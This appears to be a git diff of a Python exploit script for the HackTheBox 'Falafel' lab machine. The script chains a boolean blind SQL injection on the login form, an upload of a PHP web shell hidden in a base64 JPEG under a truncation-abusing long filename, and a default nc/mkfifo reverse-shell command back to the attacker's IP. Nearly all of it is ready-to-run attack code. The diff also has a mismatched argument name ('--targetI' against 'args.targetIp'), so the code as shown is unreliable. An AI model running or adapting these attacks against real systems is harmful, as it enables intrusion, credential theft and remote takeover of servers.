@@ -1,13 +1,16 @@
 import requests
 import argparse
 import base64
-import time
+import urllib.parse
 
 parser = argparse.ArgumentParser(description='Blind SQL Injection Boolean (Falafel hackthebox)')
 
-parser.add_argument("--hostname", default='http://10.10.10.73/', type=str,
-                    help="Hostname of falafel box")
-parser.add_argument("--command", default='rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%209999%20%3E%2Ftmp%2Ff', type=str,
+parser.add_argument("--targetI", default='http://10.10.10.73/', type=str,
+                    help="target of falafel box")
+parser.add_argument("--localIp", default='http://10.10.14.24/', type=str,
+                    help="your htb ip")
+parser.add_argument("--command",
+                    default='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9999 >/tmp/f', type=str,
                     help="Command to execute on Falafel")
 
 args = parser.parse_args()
@@ -18,16 +21,13 @@ def run_injection(session, column, char_limit):
     char = 47
     limit = 1
     while char != 123 and limit != char_limit:
-        """
-        https://www.w3resource.com/mysql/string-functions/mysql-ord-function.php
-        https://www.w3resource.com/mysql/string-functions/mysql-mid-function.php
-        """
         login = {
             'password': 'chris',
-            'username': "chris' AND ORD(MID((SELECT " + column + " FROM falafel.users WHERE username = 'admin' ORDER BY 'ID' LIMIT 0,1)," + str(limit) + ",1))>" + str(char) + "-- ORBZ"
+            'username': "chris' AND ORD(MID((SELECT " + column + " FROM falafel.users WHERE username = 'admin' ORDER BY 'ID' LIMIT 0,1)," + str(
+                limit) + ",1))>" + str(char) + "-- ORBZ"
         }
 
-        response = session.post(args.hostname + "/login.php", data=login)
+        response = session.post("http://" + args.targetIp + "/login.php", data=login)
         # SUCCESS,
         if "Wrong identification" not in response.text:
             result.append(char)
@@ -38,8 +38,9 @@ def run_injection(session, column, char_limit):
             char += 1
     return result
 
+
 def create_php_backdoor():
-    imgBackdoor = """
+    img_backdoor = """
             w7/DmMO/w6AAEEpGSUYAAQEAAAEAAQAAw7/DogIcSUNDX1BST0ZJTEUAAQEAAAIMbGNtcwIQAABt
             bnRyUkdCIFhZWiAHw5wAAQAZAAMAKQA5YWNzcEFQUEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
             AMO2w5YAAQAAAADDky1sY21zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -75,10 +76,10 @@ def create_php_backdoor():
             ZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=
         """
     try:
-        filename_length = len(str("A"*232 + ".php.jpg"))
+        filename_length = len(str("A" * 232 + ".php.jpg"))
         print('Filename length :' + str(filename_length))
-        with open(str("A"*232 + ".php.jpg"), "wb") as f:
-            f.write(base64.b64decode(imgBackdoor))
+        with open(str("A" * 232 + ".php.jpg"), "wb") as f:
+            f.write(base64.b64decode(img_backdoor))
     except Exception as e:
         print(str(e))
         exit(0)
@@ -89,9 +90,9 @@ def main():
     print("Exploit started, you should have launched your netcat and 'python -m SimpleHTTPServer 8001' listener before")
     create_php_backdoor()
 
-    # admin_password = run_injection(session, "password", 65)
-    # admin_password = ''.join(chr(i) for i in admin_password)
-    # print("md5:" + admin_password.split("/")[0])
+    admin_password = run_injection(session, "password", 65)
+    admin_password = ''.join(chr(i) for i in admin_password)
+    print("md5:" + admin_password.split("/")[0])
 
     # https://github.com/spaze/hashes/blob/master/md5.md
     admin_login = {
@@ -101,24 +102,24 @@ def main():
     }
 
     session_admin = requests.session()
-    response_a = session_admin.post(args.hostname + "/login.php", data=admin_login)
+    response_a = session_admin.post("http://" + args.targetIp + "/login.php", data=admin_login)
     if "Login Successful!" not in response_a.text:
         print("Wrong password for admin, check magic md5 hashes")
         exit(0)
 
-    response = session_admin.post(args.hostname + "/upload.php",
-                                  data={"url": "http://10.10.14.24:8001/" + "A" * 232 + ".php.jpg"})
+    response = session_admin.post("http://" + args.targetIp + "/upload.php",
+                                  data={"url": "http://" + args.localIp + ":8000/" + "A" * 232 + ".php.jpg"})
 
     result = [line for line in response.text.split('\n') if "New name is" in line]
     print("File saved under extention: " + result[0].split('.')[1])
 
-    file_location = "http://10.10.10.73/uploads/" + \
-                    [line for line in response.text.split('\n') if "<pre>CMD" in line][0].split("/")[5].split(";")[
-                        0] + "/" + result[0].split(" ")[3]
-    file_location = file_location[:-1]
-    print(file_location)
+    file_url = "http://" + args.targetIp + "/uploads/" + \
+               [line for line in response.text.split('\n') if "<pre>CMD" in line][0].split("/")[5].split(";")[
+                   0] + "/" + result[0].split(" ")[3]
+    file_url = file_url[:-1]
+    print(file_url)
 
-    cmd_r = session.get(file_location + "?cmd="+ args.command)
+    cmd_r = session.get(file_url + "?cmd=" + urllib.parse.quote(args.command).replace("/", "%2F"))
     print(cmd_r.text.split('<pre>')[1])
 
 
